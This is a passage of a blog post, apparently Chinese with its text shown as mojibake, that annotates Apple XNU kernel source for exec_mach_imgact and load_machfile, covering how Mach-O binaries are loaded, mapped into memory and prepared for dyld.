class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		/* reset local idea of thread, uthread, task */</span><br><span class="line">		thread = imgp-&gt;ip_new_thread;</span><br><span class="line">		uthread = get_bsdthread_info(thread);</span><br><span class="line">		task = new_task = get_threadtask(thread);</span><br><span class="line">		map = get_task_map(task);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		map = VM_MAP_NULL;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * We set these flags here; this is OK, since if we fail after</span><br><span class="line">	 * this point, we have already destroyed the parent process anyway.</span><br><span class="line">	 */</span><br><span class="line">    // è®¾ç½®ä¸€äº›dyldéœ€è¦ä½¿ç”¨çš„å‚æ•°</span><br><span class="line">	task_set_dyld_info(task, MACH_VM_MIN_ADDRESS, 0);</span><br><span class="line">	if (imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) &#123;</span><br><span class="line">		task_set_64bit(task, TRUE);</span><br><span class="line">		OSBitOrAtomic(P_LP64, &amp;p-&gt;p_flag);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		task_set_64bit(task, FALSE);</span><br><span class="line">		OSBitAndAtomic(~((uint32_t)P_LP64), &amp;p-&gt;p_flag);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 *	Load the Mach-O file.</span><br><span class="line">	 *</span><br><span class="line">	 * NOTE: An error after this point  indicates we have potentially</span><br><span class="line">	 * destroyed or overwritten some process state while attempting an</span><br><span class="line">	 * execve() following a vfork(), which is an unrecoverable condition.</span><br><span class="line">	 * We send the new process an immediate SIGKILL to avoid it executing</span><br><span class="line">	 * any instructions in the mutated address space. For true spawns,</span><br><span class="line">	 * this is not the case, and "too late" is still not too late to</span><br><span class="line">	 * return an error code to the parent process.</span><br><span class="line">	 */</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Actually load the image file we previously decided to load.</span><br><span class="line">	 */</span><br><span class="line">    //åŠ è½½ï¼Œæ˜ å°„machoæ–‡ä»¶åˆ°å†…å­˜</span><br><span class="line">	lret = load_machfile(imgp, mach_header, thread, map, &amp;load_result);</span><br><span class="line"></span><br><span class="line">	if (lret != LOAD_SUCCESS) &#123;</span><br><span class="line">		error = load_return_to_errno(lret);</span><br><span class="line">		goto badtoolate;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	proc_lock(p);</span><br><span class="line">	p-&gt;p_cputype = imgp-&gt;ip_origcputype;</span><br><span class="line">	p-&gt;p_cpusubtype = imgp-&gt;ip_origcpusubtype;</span><br><span class="line">	proc_unlock(p);</span><br><span class="line"></span><br><span class="line">	vm_map_set_user_wire_limit(get_task_map(task), p-&gt;p_rlimit[RLIMIT_MEMLOCK].rlim_cur);</span><br><span class="line"></span><br><span class="line">	/* </span><br><span class="line">	 * Set code-signing flags if this binary is signed, or if parent has</span><br><span class="line">	 * requested them on exec.</span><br><span class="line">	 */</span><br><span class="line">  	//è®¾ç½®äº†ä¸€å †æ ‡è®°ä½</span><br><span class="line">    //éœ€è¦å…³å¿ƒä¸€ä¸‹çš„æ˜¯è¿™é‡Œå’Œcode-signginæœ‰ç‚¹å…³ç³»</span><br><span class="line">	if (load_result.csflags &amp; CS_VALID) &#123;</span><br><span class="line">		imgp-&gt;ip_csflags |= load_result.csflags &amp; </span><br><span class="line">			(CS_VALID|</span><br><span class="line">			 CS_HARD|CS_KILL|CS_RESTRICT|CS_ENFORCEMENT|CS_REQUIRE_LV|CS_DYLD_PLATFORM|</span><br><span class="line">			 CS_EXEC_SET_HARD|CS_EXEC_SET_KILL|CS_EXEC_SET_ENFORCEMENT);</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		imgp-&gt;ip_csflags &amp;= ~CS_VALID;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_HARD)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_HARD;</span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_KILL)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_KILL;</span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_ENFORCEMENT)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_ENFORCEMENT;</span><br><span class="line">	if (p-&gt;p_csflags &amp; CS_EXEC_SET_INSTALLER)</span><br><span class="line">		imgp-&gt;ip_csflags |= CS_INSTALLER;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Set up the system reserved areas in the new address space.</span><br><span class="line">	 */</span><br><span class="line">    //ä¾æ®å¯æ‰§è¡Œæ–‡ä»¶çš„å¹³å°ï¼Œè®¾ç½®åˆé€‚çš„æ‰§è¡Œç¯å¢ƒ</span><br><span class="line">	vm_map_exec(get_task_map(task),</span><br><span class="line">		    task,</span><br><span class="line">		    (void *) p-&gt;p_fd-&gt;fd_rdir,</span><br><span class="line">		    cpu_type());</span><br><span class="line">	</span><br><span class="line">	/*</span><br><span class="line">	 * Close file descriptors which specify close-on-exec.</span><br><span class="line">	 */</span><br><span class="line">    //å…³é—­æ‰€æœ‰è¢«æ ‡è®°ä¸ºclose-on-execçš„æ–‡ä»¶</span><br><span class="line">	fdexec(p, psa != NULL ? psa-&gt;psa_flags : 0);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * deal with set[ug]id.</span><br><span class="line">	 */</span><br><span class="line">  	//å¤„ç†setuidç›¸å…³çš„é€»è¾‘ï¼Œå’Œæƒé™ç›¸å…³</span><br><span class="line">	error = exec_handle_sugid(imgp);</span><br><span class="line">	if (error) &#123;</span><br><span class="line">		goto badtoolate;</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * deal with voucher on exec-calling thread.</span><br><span class="line">	 */</span><br><span class="line">	if (imgp-&gt;ip_new_thread == NULL)</span><br><span class="line">		thread_set_mach_voucher(current_thread(), IPC_VOUCHER_NULL);</span><br><span class="line"></span><br><span class="line">	/* Make sure we won't interrupt ourself signalling a partial process */</span><br><span class="line">	if (!vfexec &amp;&amp; !spawn &amp;&amp; (p-&gt;p_lflag &amp; P_LTRACED))</span><br><span class="line">		psignal(p, SIGTRAP);</span><br><span class="line">	</span><br><span class="line">  	//ä¸ºè¿›ç¨‹è®¾ç½®åº”ç”¨å±‚çš„æ ˆåœ°å€</span><br><span class="line">	if (load_result.unixproc &amp;&amp;</span><br><span class="line">		create_unix_stack(get_task_map(task),</span><br><span class="line">				  &amp;load_result,</span><br><span class="line">				  p) != KERN_SUCCESS) &#123;</span><br><span class="line">		error = load_return_to_errno(LOAD_NOSPACE);</span><br><span class="line">		goto badtoolate;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (vfexec || spawn) &#123;</span><br><span class="line">		old_map = vm_map_switch(get_task_map(task));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if (load_result.unixproc) &#123;</span><br><span class="line">		user_addr_t	ap;</span><br><span class="line"></span><br><span class="line">		/*</span><br><span class="line">		 * Copy the strings area out into the new process address</span><br><span class="line">		 * space.</span><br><span class="line">		 */</span><br><span class="line">		ap = p-&gt;user_stack;</span><br><span class="line">		error = exec_copyout_strings(imgp, &amp;ap);</span><br><span class="line">		if (error) &#123;</span><br><span class="line">			if (vfexec || spawn)</span><br><span class="line">				vm_map_switch(old_map);</span><br><span class="line">			goto badtoolate;</span><br><span class="line">		&#125;</span><br><span class="line">		/* Set the stack */</span><br><span class="line">		thread_setuserstack(thread, ap);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	if (load_result.dynlinker) &#123;</span><br><span class="line">		uint64_t	ap;</span><br><span class="line">		int			new_ptr_size = (imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) ? 8 : 4;</span><br><span class="line"></span><br><span class="line">		/* Adjust the stack */</span><br><span class="line">		ap = thread_adjuserstack(thread, -new_ptr_size);</span><br><span class="line">		error = copyoutptr(load_result.mach_header, ap, new_ptr_size);</span><br><span class="line"></span><br><span class="line">		if (error) &#123;</span><br><span class="line">			if (vfexec || spawn)</span><br><span class="line">				vm_map_switch(old_map);</span><br><span class="line">			goto badtoolate;</span><br><span class="line">		&#125;</span><br><span class="line">		task_set_dyld_info(task, load_result.all_image_info_addr,</span><br><span class="line">		    load_result.all_image_info_size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Avoid immediate VM faults back into kernel */</span><br><span class="line">  	//é˜²æ­¢ç«‹åˆ»æ‰§è¡ŒæŒ‡ä»¤å¯¼è‡´çš„é”™è¯¯ï¼Œåšäº†å¤§é‡å’Œdyldç›¸å…³çš„äº‹æƒ…</span><br><span class="line">	exec_prefault_data(p, imgp, &amp;load_result);</span><br><span class="line"></span><br><span class="line">	if (vfexec || spawn) &#123;</span><br><span class="line">		vm_map_switch(old_map);</span><br><span class="line">	&#125;</span><br><span class="line">	/* Set the entry point */</span><br><span class="line">	thread_setentrypoint(thread, load_result.entry_point);</span><br><span class="line"></span><br><span class="line">	/* Stop profiling */</span><br><span class="line">	stopprofclock(p);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Reset signal state.</span><br><span class="line">	 */</span><br><span class="line">	execsigs(p, thread);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * need to cancel async IO requests that can be cancelled and wait for those</span><br><span class="line">	 * already active.  MAY BLOCK!</span><br><span class="line">	 */</span><br><span class="line">	_aio_exec( p );</span><br><span class="line"></span><br><span class="line">#if SYSV_SHM</span><br><span class="line">	/* FIXME: Till vmspace inherit is fixed: */</span><br><span class="line">	if (!vfexec &amp;&amp; p-&gt;vm_shm)</span><br><span class="line">		shmexec(p);</span><br><span class="line">#endif</span><br><span class="line">#if SYSV_SEM</span><br><span class="line">	/* Clean up the semaphores */</span><br><span class="line">	semexit(p);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Remember file name for accounting.</span><br><span class="line">	 */</span><br><span class="line">	p-&gt;p_acflag &amp;= ~AFORK;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Set p-&gt;p_comm and p-&gt;p_name to the name passed to exec</span><br><span class="line">	 */</span><br><span class="line">	p_name_len = sizeof(p-&gt;p_name) - 1;</span><br><span class="line">	if(imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen &gt; p_name_len)</span><br><span class="line">		imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen = p_name_len;</span><br><span class="line">	bcopy((caddr_t)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_nameptr, (caddr_t)p-&gt;p_name,</span><br><span class="line">		(unsigned)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen);</span><br><span class="line">	p-&gt;p_name[imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen] = '\0';</span><br><span class="line"></span><br><span class="line">	if (imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen &gt; MAXCOMLEN)</span><br><span class="line">		imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen = MAXCOMLEN;</span><br><span class="line">	bcopy((caddr_t)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_nameptr, (caddr_t)p-&gt;p_comm,</span><br><span class="line">		(unsigned)imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen);</span><br><span class="line">	p-&gt;p_comm[imgp-&gt;ip_ndp-&gt;ni_cnd.cn_namelen] = '\0';</span><br><span class="line"></span><br><span class="line">	pal_dbg_set_task_name( p-&gt;task );</span><br><span class="line"></span><br><span class="line">#if DEVELOPMENT || DEBUG</span><br><span class="line">	/* </span><br><span class="line">	 * Update the pid an proc name for importance base if any</span><br><span class="line">	 */</span><br><span class="line">	task_importance_update_owner_info(p-&gt;task);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	memcpy(&amp;p-&gt;p_uuid[0], &amp;load_result.uuid[0], sizeof(p-&gt;p_uuid));</span><br><span class="line"></span><br><span class="line">// &lt;rdar://6598155&gt; dtrace code cleanup needed</span><br><span class="line">#if CONFIG_DTRACE</span><br><span class="line">	/*</span><br><span class="line">	 * Invalidate any predicate evaluation already cached for this thread by DTrace.</span><br><span class="line">	 * That's because we've just stored to p_comm and DTrace refers to that when it</span><br><span class="line">	 * evaluates the "execname" special variable. uid and gid may have changed as well.</span><br><span class="line">	 */</span><br><span class="line">	dtrace_set_thread_predcache(current_thread(), 0);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Free any outstanding lazy dof entries. It is imperative we</span><br><span class="line">	 * always call dtrace_lazy_dofs_destroy, rather than null check</span><br><span class="line">	 * and call if !NULL. If we NULL test, during lazy dof faulting</span><br><span class="line">	 * we can race with the faulting code and proceed from here to</span><br><span class="line">	 * beyond the helpers cleanup. The lazy dof faulting will then</span><br><span class="line">	 * install new helpers which no longer belong to this process!</span><br><span class="line">	 */</span><br><span class="line">	dtrace_lazy_dofs_destroy(p);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">    	 * Clean up any DTrace helpers for the process.</span><br><span class="line">    	 */</span><br><span class="line">    	if (p-&gt;p_dtrace_helpers != NULL &amp;&amp; dtrace_helpers_cleanup) &#123;</span><br><span class="line">    		(*dtrace_helpers_cleanup)(p);</span><br><span class="line">    	&#125;</span><br><span class="line">	</span><br><span class="line">    	/*</span><br><span class="line">    	 * Cleanup the DTrace provider associated with this process.</span><br><span class="line">    	 */</span><br><span class="line">	proc_lock(p);</span><br><span class="line">	if (p-&gt;p_dtrace_probes &amp;&amp; dtrace_fasttrap_exec_ptr) &#123;</span><br><span class="line">		(*dtrace_fasttrap_exec_ptr)(p);</span><br><span class="line">	&#125;</span><br><span class="line">	proc_unlock(p);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	if (kdebug_enable) &#123;</span><br><span class="line">		long dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4;</span><br><span class="line"></span><br><span class="line">		/*</span><br><span class="line">		 * Collect the pathname for tracing</span><br><span class="line">		 */</span><br><span class="line">		kdbg_trace_string(p, &amp;dbg_arg1, &amp;dbg_arg2, &amp;dbg_arg3, &amp;dbg_arg4);</span><br><span class="line"></span><br><span class="line">		if (vfexec || spawn) &#123;</span><br><span class="line">			KERNEL_DEBUG_CONSTANT1(TRACE_DATA_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					p-&gt;p_pid ,0,0,0, (uintptr_t)thread_tid(thread));</span><br><span class="line">			KERNEL_DEBUG_CONSTANT1(TRACE_STRING_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4, (uintptr_t)thread_tid(thread));</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			KERNEL_DEBUG_CONSTANT(TRACE_DATA_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					p-&gt;p_pid ,0,0,0,0);</span><br><span class="line">			KERNEL_DEBUG_CONSTANT(TRACE_STRING_EXEC | DBG_FUNC_NONE,</span><br><span class="line">					dbg_arg1, dbg_arg2, dbg_arg3, dbg_arg4, 0);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * If posix_spawned with the START_SUSPENDED flag, stop the</span><br><span class="line">	 * process before it runs.</span><br><span class="line">	 */</span><br><span class="line">	if (imgp-&gt;ip_px_sa != NULL) &#123;</span><br><span class="line">		psa = (struct _posix_spawnattr *) imgp-&gt;ip_px_sa;</span><br><span class="line">		if (psa-&gt;psa_flags &amp; POSIX_SPAWN_START_SUSPENDED) &#123;</span><br><span class="line">			proc_lock(p);</span><br><span class="line">			p-&gt;p_stat = SSTOP;</span><br><span class="line">			proc_unlock(p);</span><br><span class="line">			(void) task_suspend_internal(p-&gt;task);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * mark as execed, wakeup the process that vforked (if any) and tell</span><br><span class="line">	 * it that it now has its own resources back</span><br><span class="line">	 */</span><br><span class="line">	OSBitOrAtomic(P_EXEC, &amp;p-&gt;p_flag);</span><br><span class="line">	proc_resetregister(p);</span><br><span class="line">	if (p-&gt;p_pptr &amp;&amp; (p-&gt;p_lflag &amp; P_LPPWAIT)) &#123;</span><br><span class="line">		proc_lock(p);</span><br><span class="line">		p-&gt;p_lflag &amp;= ~P_LPPWAIT;</span><br><span class="line">		proc_unlock(p);</span><br><span class="line">		wakeup((caddr_t)p-&gt;p_pptr);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Pay for our earlier safety; deliver the delayed signals from</span><br><span class="line">	 * the incomplete vfexec process now that it's complete.</span><br><span class="line">	 */</span><br><span class="line">	if (vfexec &amp;&amp; (p-&gt;p_lflag &amp; P_LTRACED)) &#123;</span><br><span class="line">		psignal_vfork(p, new_task, thread, SIGTRAP);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	goto done;</span><br><span class="line"></span><br><span class="line">badtoolate:</span><br><span class="line">	/* Don't allow child process to execute any instructions */</span><br><span class="line">	if (!spawn) &#123;</span><br><span class="line">		if (vfexec) &#123;</span><br><span class="line">			psignal_vfork(p, new_task, thread, SIGKILL);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			psignal(p, SIGKILL);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		/* We can't stop this system call at this point, so just pretend we succeeded */</span><br><span class="line">		error = 0;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">done:</span><br><span class="line">	if (!spawn) &#123;</span><br><span class="line">		/* notify only if it has not failed due to FP Key error */</span><br><span class="line">		if ((p-&gt;p_lflag &amp; P_LTERM_DECRYPTFAIL) == 0)</span><br><span class="line">			proc_knote(p, NOTE_EXEC);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	/* Drop extra references for cases where we don't expect the caller to clean up */</span><br><span class="line">	if (vfexec || (spawn &amp;&amp; error == 0)) &#123;</span><br><span class="line">		task_deallocate(new_task);</span><br><span class="line">		thread_deallocate(thread);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">	return(error);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¯¥å‡½æ•°ä¸»è¦åšè¿™å‡ ä»¶äº‹æƒ…ï¼š</p>
<ul>
<li>å¯¹machoæ–‡ä»¶åšæœ€åŸºæœ¬çš„æ£€æµ‹</li>
<li><code>fork</code>æ–°çš„çº¿ç¨‹è¿è¡Œmacho</li>
<li>æ˜ å°„machoæ–‡ä»¶åˆ°å†…å­˜ä¸­</li>
<li>å¯¹setuidï¼Œcode-signç­‰æƒé™ç›¸å…³çš„äº‹æƒ…æœ‰å¤„ç†</li>
<li>ä¸ºdyldæ¥æ‰‹machoæ–‡ä»¶çš„å¤„ç†åšäº†å¤§é‡çš„å‡†å¤‡å·¥ä½œ</li>
<li>dyldå¤„ç†å®Œä¹‹åï¼Œå¯¹èµ„æºçš„é‡Šæ”¾</li>
</ul>
<h2 id="1-4_load_machfile">1.4 load_machfile</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">load_return_t</span></span><br><span class="line">load_machfile(</span><br><span class="line">	<span class="keyword">struct</span> image_params	*imgp,</span><br><span class="line">	<span class="keyword">struct</span> mach_header	*header,</span><br><span class="line">	<span class="keyword">thread_t</span> 		thread,</span><br><span class="line">	<span class="keyword">vm_map_t</span> 		new_map,</span><br><span class="line">	<span class="keyword">load_result_t</span>		*result</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">struct</span> vnode		*vp = imgp-&gt;ip_vp;</span><br><span class="line">	<span class="keyword">off_t</span>			file_offset = imgp-&gt;ip_arch_offset;</span><br><span class="line">	<span class="keyword">off_t</span>			macho_size = imgp-&gt;ip_arch_size;</span><br><span class="line">	<span class="keyword">off_t</span>			file_size = imgp-&gt;ip_vattr-&gt;va_data_size;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">pmap_t</span>			pmap = <span class="number">0</span>;	<span class="comment">/* protected by create_map */</span></span><br><span class="line">	<span class="keyword">vm_map_t</span>		<span class="built_in">map</span>;</span><br><span class="line">	<span class="keyword">vm_map_t</span>		old_map;</span><br><span class="line">	<span class="keyword">task_t</span>			old_task = TASK_NULL; <span class="comment">/* protected by create_map */</span></span><br><span class="line">	<span class="keyword">load_result_t</span>		myresult;</span><br><span class="line">	<span class="keyword">load_return_t</span>		lret;</span><br><span class="line">	<span class="keyword">boolean_t</span> create_map = FALSE;</span><br><span class="line">	<span class="keyword">boolean_t</span> enforce_hard_pagezero = TRUE;</span><br><span class="line">	<span class="keyword">int</span> spawn = (imgp-&gt;ip_flags &amp; IMGPF_SPAWN);</span><br><span class="line">	<span class="keyword">task_t</span> task = current_task();</span><br><span class="line">	<span class="keyword">proc_t</span> p = current_proc();</span><br><span class="line">	<span class="keyword">mach_vm_offset_t</span>	aslr_offset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">mach_vm_offset_t</span>	dyld_aslr_offset = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">kern_return_t</span> 		kret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (macho_size &gt; file_size) &#123;</span><br><span class="line">		<span class="keyword">return</span>(LOAD_BADMACHO);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (new_map == VM_MAP_NULL) &#123;</span><br><span class="line">		create_map = TRUE;</span><br><span class="line">		old_task = current_task();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span><br><span class="line">	 * If we are spawning, we have created backing objects for the process</span><br><span class="line">	 * already, which include non-lazily creating the task map.  So we</span><br><span class="line">	 * are going to switch out the task map with one appropriate for the</span><br><span class="line">	 * bitness of the image being loaded.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (spawn) &#123;</span><br><span class="line">		create_map = TRUE;</span><br><span class="line">		old_task = get_threadtask(thread);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">  	<span class="comment">//å¦‚æœæœ‰new_mapå°±ç”¨å‚æ•°ä¼ è¿›æ¥çš„new_map</span></span><br><span class="line">  	<span class="comment">//å¦åˆ™å°±é€šè¿‡pmap_create,vm_map_createå‡½æ•°åˆ›å»ºæ–°çš„å†…å­˜ç©ºé—´</span></span><br><span class="line">	<span class="keyword">if</span> (create_map) &#123;</span><br><span class="line">		<span class="keyword">task_t</span> ledger_task;</span><br><span class="line">		<span class="keyword">if</span> (imgp-&gt;ip_new_thread) &#123;</span><br><span class="line">			ledger_task = get_threadtask(imgp-&gt;ip_new_thread);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			ledger_task = task;</span><br><span class="line">		&#125;</span><br><span class="line">		pmap = pmap_create(get_task_ledger(ledger_task),</span><br><span class="line">				   (<span class="keyword">vm_map_size_t</span>) <span class="number">0</span>,</span><br><span class="line">				   ((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) != <span class="number">0</span>));</span><br><span class="line">		pal_switch_pmap(thread, pmap, imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT);</span><br><span class="line">		<span class="built_in">map</span> = vm_map_create(pmap,</span><br><span class="line">				<span class="number">0</span>,</span><br><span class="line">				vm_compute_max_offset(((imgp-&gt;ip_flags &amp; IMGPF_IS_64BIT) == IMGPF_IS_64BIT)),</span><br><span class="line">				TRUE);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		<span class="built_in">map</span> = new_map;</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">if</span>   (__ARM_ARCH_7K__ &gt;= <span class="number">2</span>) &amp;&amp; defined(PLATFORM_WatchOS)</span></span><br><span class="line">	<span class="comment">/* enforce 16KB alignment for watch targets with new ABI */</span></span><br><span class="line">	vm_map_set_page_shift(<span class="built_in">map</span>, SIXTEENK_PAGE_SHIFT);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span> <span class="comment">/* __arm64__ */</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">ifndef</span>	CONFIG_ENFORCE_SIGNED_CODE</span></span><br><span class="line">	<span class="comment">/* This turns off faulting for executable pages, which allows</span><br><span class="line">	 * to circumvent Code Signing Enforcement. The per process</span><br><span class="line">	 * flag (CS_ENFORCEMENT) is not set yet, but we can use the</span><br><span class="line">	 * global flag.</span><br><span class="line">	 */</span></span><br><span class="line">	<span class="keyword">if</span> ( !cs_enforcement(<span class="literal">NULL</span>) &amp;&amp; (header-&gt;flags &amp; MH_ALLOW_STACK_EXECUTION) )</span><br><span class="line">	        vm_map_disable_NX(<span class="built_in">map</span>);</span><br><span class="line"><span class="preprocessor">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Forcibly disallow execution from data pages on even if the arch</span><br><span class="line">	 * normally permits it. */</span></span><br><span class="line">  	<span 